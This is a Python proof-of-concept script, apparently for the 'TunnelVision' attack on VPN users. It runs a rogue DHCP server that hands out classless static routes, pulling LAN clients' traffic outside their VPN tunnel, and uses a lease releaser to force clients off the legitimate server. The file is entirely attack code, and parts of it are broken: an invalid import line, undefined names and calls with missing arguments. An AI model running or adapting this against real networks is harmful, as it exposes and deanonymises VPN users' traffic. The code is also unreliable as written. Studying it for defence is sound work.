#!/usr/bin/python3
from arcane.network.interface import NetworkInterface
from arcane.dhcp.lease import DHCPLease
from arcane.dhcp.server import DHCPServer
from arcane.dhcp.subleaser import DHCPSubleaser
from arcane.dhcp.releaser import DHCPReleaser
from arcane.runtime import RUNTIME, api, on_event
from arcane.threaded_worker import ThreadedWorker
from arcane.events import DHCPServerEvent, ARPTableEvent, DHCPReleaseEvent
from arcane.utilities import binary_search_list
from enum import Enum, auto()
import ipaddress
import logging
import argparse
import time


parser = argparse.ArgumentParser(prog='TunnelVision PoC', description='Decloaks VPN users on the LAN')
parser.add_argument('-i', '--interface', help="Interface to listen on", required=True)
parser.add_argument('-s', '--server', help="Interface to listen on", required=True)
parser.add_argument('-t', '--target', action='append', help="Target destinations to check for. May be listed more than once")
parser.add_argument('-l', '--lease-time', type=int, default=10, help="Lease duration")
parser.add_argument('-v', '--verbose', action="store_true", help="Print DEBUG messages to console")


class SidechannelState(Enum):
    STARTED = auto()
    WAITING_FOR_ACCEPT = auto()
    ANALYSIS = auto()
    FINISHED = auto()


class RouteSearchSpace(object):
    def __init__(self, space: str):
        self.space = ipaddress.IPv4Network(space) if type(space) is str else space
    
    def split(self):
        return [RouteSearchSpace(s) for s in self.space.subnets(1)]


class ClientState(object):
    def __init__(self, state: SidechannelState=SidechannelState.STARTED):
        self.state = state
        self.traffic_observed = False



class Sidechanneler(ThreadedWorker):
    def __init__(self, server: DHCPServer, searchspace):
        self.server      = server
        self.clients     = {}
        self.searchspace = RouteSearchSpace(searchspace)
        super().__init__()
    

    @on_event(DHCPServerEvent.LEASE_ACCEPTED)
    def handle_lease_accepted(self, mac_address: str, lease: DHCPLease):
        # Client not registered, start the FSM
        if not mac_address in self.clients:
            self.clients[mac_address] = ClientState()
            self.inject_routes(mac_address, [], lease, do_after=server.options['lease_time'])

        # Lease has been accepted! Move to analysis
        elif self.clients[mac_address].state == SidechannelState.WAITING_FOR_ACCEPT:
            self.clients[mac_address].state = SidechannelState.ANALYSIS
            self.analyze_traffic(mac_address, do_after=server.options['lease_time']+5)


    @on_event(NetworkInterfaceEvent.READ, lambda iface, proto, packet: DHCP not in packet)
    @api
    def listen_for_traffic(self, iface, proto, packet):
        if packet.src in self.clients:
            self.clients[packet.src].traffic_observed = True

            # if packet.src not in self.traffic_volume:
            #     self.traffic_volume[packet.src] = []
            
            # # Manage traffic lists
            # self.traffic_volume[packet.src].append(time.time())
            # idx = binary_search_list(self.traffic_volume[packet.src], time.time()-server.options['lease_time']*4, key=lambda item: item[0], fuzzy=True)
            # self.traffic_volume[packet.src] = self.traffic_volume[packet.src][idx:]

    
    @api
    def inject_routes(self, mac_address: str, routes: list, lease: DHCPLease):
        lease.options.update({'classless_static_routes': routes})
        self.clients[mac_address].state = SidechannelState.WAITING_FOR_ACCEPT


    @api
    def analyze_traffic(self, mac_address: str):
        # idx = binary_search_list(self.traffic_volume[mac_address], time.time()-server.options['lease_time'], key=lambda item: item[0], fuzzy=True)
        # if len(self.traffic_volume[packet.src][idx:]):

        # There's still traffic; do more blocking
        if self.clients[mac_address].traffic_observed:
            self.clients.inject_routes()
        
        # No traffic observed; unblocked section is clean
        else:
            self.clients.inject_routes()

    




def build_routes(targets: list):
    negative_routes = [ipaddress.IPv4Network('0.0.0.0/0')]
    for target in targets:
        temp_routes = [r for r in negative_routes]
        for route in negative_routes:
            try:
                temp_routes.extend(route.address_exclude(ipaddress.IPv4Network(target)))
            except ValueError:
                temp_routes.append(route)
        
        negative_routes = temp_routes
    
    return [str(r) for r in negative_routes]


def main():
    args = parser.parse_args()
    logging.root.setLevel(logging.DEBUG if args.verbose else logging.INFO)

    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPServerEvent.LEASE_OFFERED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(ARPTableEvent.ENTRY_CHANGED)
    RUNTIME.event_manager.log_filter.allowlist_events.add(DHCPReleaseEvent.LEASE_RELEASED)
    
    interface       = NetworkInterface(args.interface)
    negative_routes = {
        'classless_static_routes': [f'{r}:{interface.ip_address}' for r in build_routes(args.target)],
        'lease_time': args.lease_time
    }

    all_traffic = {
        'lease_time': args.lease_time
    }

    server   = DHCPServer(interface, DHCPSubleaser(interface), **all_traffic)
    releaser = DHCPReleaser(interface, server.lease_generator, args.server, sweep_time=5)

    while True:
        time.sleep(args.lease_time)
        server.options = negative_routes
        time.sleep(args.lease_time)
        server.options = all_traffic


    interface.thread.join()



if __name__ == "__main__":
    main()
